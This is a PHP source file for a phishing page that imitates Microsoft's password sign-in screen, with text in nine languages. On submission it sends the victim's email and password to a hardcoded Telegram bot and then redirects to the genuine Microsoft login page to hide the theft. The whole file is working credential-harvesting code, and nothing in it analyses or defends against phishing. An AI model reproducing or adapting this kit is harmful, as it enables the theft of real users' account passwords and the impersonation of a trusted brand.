<?php
session_start();

if ($_SESSION['authorized'] !== "1") {
    die('you are not allowed');
}

$email = $_SESSION['email'] = $_POST['email'] ?? '';
$messageSent = false;
$error = '';

// Function to detect browser language
function detectLanguage() {
    $available_langs = ['fr', 'en', 'es', 'it', 'ja', 'zh', 'pt-br', 'es-mx', 'ro'];
    $default_lang = 'en';
    
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $browser_langs = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
        
        foreach ($browser_langs as $browser_lang) {
            // Extract primary language (fr, en, etc.)
            $lang = substr($browser_lang, 0, 2);
            $full_lang = strtolower(substr($browser_lang, 0, 5));
            
            // Check for specific variants first
            if ($full_lang == 'pt-br' && in_array('pt-br', $available_langs)) {
                return 'pt-br';
            } elseif ($full_lang == 'es-mx' && in_array('es-mx', $available_langs)) {
                return 'es-mx';
            } elseif (in_array($full_lang, $available_langs)) {
                return $full_lang;
            }
            
            // Then check primary language
            if (in_array($lang, $available_langs)) {
                return $lang;
            }
            
            // Special cases
            if ($lang == 'pt' && in_array('pt-br', $available_langs)) {
                return 'pt-br';
            }
            if ($lang == 'es' && in_array('es', $available_langs)) {
                return 'es';
            }
            if ($lang == 'zh' && in_array('zh', $available_langs)) {
                return 'zh';
            }
            if ($lang == 'ro' && in_array('ro', $available_langs)) {
                return 'ro';
            }
        }
    }
    
    return $default_lang;
}

$lang = detectLanguage();

// Full translations array for all languages
$translations = [
    'fr' => [
        'title' => 'Connexion Microsoft',
        'enter_password' => 'Entrez votre mot de passe',
        'placeholder' => 'Mot de passe',
        'forgot_password' => 'Vous avez oublié votre mot de passe ?',
        'next' => 'Suivant',
        'alt_login' => 'Se connecter avec un autre compte Microsoft',
        'help' => 'Aide',
        'terms' => 'Conditions d\'utilisation',
        'privacy' => 'Confidentialité et cookies',
        'accessibility' => 'Accessibilité : partiellement conforme',
        'private_notice' => 'Utilisez la navigation privée s\'il ne s\'agit pas de votre appareil.',
        'more_info' => 'Découvrir plus d\'informations',
        'empty_password' => 'Veuillez entrer un mot de passe.',
    ],
    'en' => [
        'title' => 'Microsoft Sign In',
        'enter_password' => 'Enter your password',
        'placeholder' => 'Password',
        'forgot_password' => 'Forgot your password?',
        'next' => 'Next',
        'alt_login' => 'Sign in with another Microsoft account',
        'help' => 'Help',
        'terms' => 'Terms of use',
        'privacy' => 'Privacy and cookies',
        'accessibility' => 'Accessibility: partially compliant',
        'private_notice' => 'Use private browsing if this is not your device.',
        'more_info' => 'Learn more',
        'empty_password' => 'Please enter a password.',
    ],
    'es' => [
        'title' => 'Inicio de sesión de Microsoft',
        'enter_password' => 'Ingresa tu contraseña',
        'placeholder' => 'Contraseña',
        'forgot_password' => '¿Olvidaste tu contraseña?',
        'next' => 'Siguiente',
        'alt_login' => 'Iniciar sesión con otra cuenta de Microsoft',
        'help' => 'Ayuda',
        'terms' => 'Términos de uso',
        'privacy' => 'Privacidad y cookies',
        'accessibility' => 'Accesibilidad: parcialmente conforme',
        'private_notice' => 'Usa navegación privada si este no es tu dispositivo.',
        'more_info' => 'Saber más',
        'empty_password' => 'Por favor, ingresa una contraseña.',
    ],
    'es-mx' => [
        'title' => 'Inicio de sesión de Microsoft',
        'enter_password' => 'Ingresa tu contraseña',
        'placeholder' => 'Contraseña',
        'forgot_password' => '¿Olvidaste tu contraseña?',
        'next' => 'Siguiente',
        'alt_login' => 'Iniciar sesión con otra cuenta de Microsoft',
        'help' => 'Ayuda',
        'terms' => 'Términos de uso',
        'privacy' => 'Privacidad y cookies',
        'accessibility' => 'Accesibilidad: parcialmente conforme',
        'private_notice' => 'Usa navegación privada si este no es tu dispositivo.',
        'more_info' => 'Saber más',
        'empty_password' => 'Por favor, ingresa una contraseña.',
    ],
    'it' => [
        'title' => 'Accesso Microsoft',
        'enter_password' => 'Inserisci la tua password',
        'placeholder' => 'Password',
        'forgot_password' => 'Password dimenticata?',
        'next' => 'Avanti',
        'alt_login' => 'Accedi con un altro account Microsoft',
        'help' => 'Aiuto',
        'terms' => 'Condizioni d\'uso',
        'privacy' => 'Privacy e cookie',
        'accessibility' => 'Accessibilità: parzialmente conforme',
        'private_notice' => 'Usa la navigazione privata se questo non è il tuo dispositivo.',
        'more_info' => 'Scopri di più',
        'empty_password' => 'Inserisci una password.',
    ],
    'ja' => [
        'title' => 'Microsoft サインイン',
        'enter_password' => 'パスワードを入力してください',
        'placeholder' => 'パスワード',
        'forgot_password' => 'パスワードをお忘れの場合',
        'next' => '次へ',
        'alt_login' => '別のMicrosoftアカウントでサインイン',
        'help' => 'ヘルプ',
        'terms' => '利用規約',
        'privacy' => 'プライバシーとCookie',
        'accessibility' => 'アクセシビリティ: 部分的に準拠',
        'private_notice' => 'このデバイスが自分のものでない場合は、プライベートブラウジングを使用してください。',
        'more_info' => '詳細情報',
        'empty_password' => 'パスワードを入力してください。',
    ],
    'zh' => [
        'title' => 'Microsoft 登录',
        'enter_password' => '输入你的密码',
        'placeholder' => '密码',
        'forgot_password' => '忘记了密码？',
        'next' => '下一步',
        'alt_login' => '使用其他Microsoft帐户登录',
        'help' => '帮助',
        'terms' => '使用条款',
        'privacy' => '隐私和 Cookie',
        'accessibility' => '辅助功能：部分符合',
        'private_notice' => '如果这不是你的设备，请使用私密浏览。',
        'more_info' => '了解更多信息',
        'empty_password' => '请输入密码。',
    ],
    'pt-br' => [
        'title' => 'Entrar na Microsoft',
        'enter_password' => 'Digite sua senha',
        'placeholder' => 'Senha',
        'forgot_password' => 'Esqueceu sua senha?',
        'next' => 'Avançar',
        'alt_login' => 'Entrar com outra conta Microsoft',
        'help' => 'Ajuda',
        'terms' => 'Termos de uso',
        'privacy' => 'Privacidade e cookies',
        'accessibility' => 'Acessibilidade: parcialmente em conformidade',
        'private_notice' => 'Use navegação privada se este não for seu dispositivo.',
        'more_info' => 'Saiba mais',
        'empty_password' => 'Por favor, digite uma senha.',
    ],
    'ro' => [
        'title' => 'Autentificare Microsoft',
        'enter_password' => 'Introduceți parola',
        'placeholder' => 'Parolă',
        'forgot_password' => 'Ați uitat parola?',
        'next' => 'Următorul',
        'alt_login' => 'Conectați-vă cu un alt cont Microsoft',
        'help' => 'Ajutor',
        'terms' => 'Termeni de utilizare',
        'privacy' => 'Confidențialitate și cookie-uri',
        'accessibility' => 'Accesibilitate: parțial conformă',
        'private_notice' => 'Utilizați navigarea privată dacă acesta nu este dispozitivul dvs.',
        'more_info' => 'Aflați mai multe',
        'empty_password' => 'Vă rugăm să introduceți o parolă.',
    ]
];

$t = $translations[$lang];

// Traitement du mot de passe
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = trim($_POST['password'] ?? '');

    if (empty($password)) {
        $error = $t['empty_password'];
    } else {
        // Envoi Telegram
        $telegramBotToken = '7158756945:AAF3bCKrXr6_C8qBNRfgYOe7AWWt38_31As';
        $telegramChatId = '549796179';

        $message = "🔐 Connexion Microsoft\n📧 Email: $email\n🔑 Mot de passe: $password";

        $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

        $data = [
            'chat_id' => $telegramChatId,
            'text' => $message
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data)
            ]
        ];
        $context  = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);

        // Redirection après envoi
        header("Location: https://login.microsoftonline.com/");
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="<?= $lang ?>">
<head>
  <meta charset="UTF-8" />
  <title><?= htmlspecialchars($t['title']) ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: "Segoe UI", sans-serif;
      background: url('bg.svg') no-repeat center center fixed;
      background-size: cover;
      color: #000;
    }

    .container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }

    .logo {
      margin-bottom: 25px;
      text-align: left;
    }

    .logo img {
      height: 24px;
    }

    .email-tag {
      display: inline-block;
      background-color: #f3f2f1;
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 14px;
      margin-bottom: 25px;
      word-break: break-word;
    }

    h2 {
      font-weight: normal;
      font-size: 20px;
      margin-bottom: 20px;
    }

    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #888;
      border-radius: 2px;
      font-size: 16px;
      margin-bottom: 15px;
    }

    .link {
      display: block;
      margin-bottom: 30px;
      color: #0067b8;
      font-size: 14px;
      text-decoration: none;
    }

    .link:hover {
      text-decoration: underline;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #0067b8;
      color: white;
      border: none;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #005ba1;
    }

    .alt-link {
      margin-top: 20px;
      text-align: center;
    }

    .alt-link a {
      color: #0067b8;
      font-size: 14px;
      text-decoration: none;
    }

    .alt-link a:hover {
      text-decoration: underline;
    }

    .footer {
      position: relative;
      bottom: 0;
      width: 100%;
      text-align: center;
      font-size: 11px;
      color: #444;
      padding: 15px 20px;
      background-color: transparent;
    }

    .footer a {
      margin: 0 6px;
      color: #444;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    /* Tablet */
    @media (max-width: 768px) {
      .login-box {
        padding: 30px 25px;
      }

      h2 {
        font-size: 18px;
      }

      input[type="password"] {
        font-size: 15px;
      }

      button {
        font-size: 15px;
        padding: 10px;
      }
    }

    /* Mobile */
    @media (max-width: 480px) {
      .container {
        padding: 15px;
      }

      .login-box {
        padding: 25px 20px;
        border-radius: 6px;
      }

      .email-tag {
        font-size: 13px;
        padding: 6px 14px;
      }

      h2 {
        font-size: 17px;
        margin-bottom: 15px;
      }

      input[type="password"] {
        font-size: 14px;
        padding: 9px;
      }

      button {
        font-size: 14px;
        padding: 10px;
      }

      .link, .alt-link a {
        font-size: 13px;
      }

      .footer {
        font-size: 10px;
        padding: 12px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="login-box">
      <div class="logo">
        <img src="logo.png" alt="Microsoft Logo" />
      </div>
      <div class="email-tag"><?= htmlspecialchars($email) ?></div>
      <h2><?= htmlspecialchars($t['enter_password']) ?></h2>

      <?php if (!empty($error)): ?>
        <div class="error-message" style="color:red; font-size:14px; margin-bottom:10px;">
          <?= htmlspecialchars($error) ?>
        </div>
      <?php endif; ?>

      <form method="POST" action="">
        <input type="hidden" name="email" value="<?= htmlspecialchars($email) ?>">
        <input type="password" name="password" placeholder="<?= htmlspecialchars($t['placeholder']) ?>" required />
        <a href="#" class="link"><?= htmlspecialchars($t['forgot_password']) ?></a>
        <button type="submit"><?= htmlspecialchars($t['next']) ?></button>
      </form>

      <div class="alt-link">
        <a href="#"><?= htmlspecialchars($t['alt_login']) ?></a>
      </div>
    </div>
  </div>

  <div class="footer">
    <a href="#"><?= htmlspecialchars($t['help']) ?></a>
    <a href="#"><?= htmlspecialchars($t['terms']) ?></a>
    <a href="#"><?= htmlspecialchars($t['privacy']) ?></a>
    <a href="#"><?= htmlspecialchars($t['accessibility']) ?></a>
    <br />
    <?= htmlspecialchars($t['private_notice']) ?>
    <a href="#"><?= htmlspecialchars($t['more_info']) ?></a>
  </div>

</body>
</html>